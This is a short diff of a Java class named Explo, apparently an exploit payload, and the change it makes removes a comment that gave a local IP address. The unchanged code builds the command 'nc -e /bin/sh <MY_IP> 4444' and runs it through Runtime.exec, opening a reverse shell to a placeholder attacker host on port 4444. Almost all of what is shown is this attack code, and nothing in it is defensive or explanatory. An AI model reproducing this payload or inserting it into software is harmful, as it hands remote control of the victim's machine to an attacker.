@@ -258,7 +258,7 @@ import java.io.InputStreamReader;
 public class Explo {
 
 	public static void main(String[] args) throws IOException {
-		//10.0.2.15 is my ip
+		
 		String cmd = "nc -e /bin/sh <MY_IP> 4444";
 		Process p = Runtime.getRuntime().exec(cmd);
 		
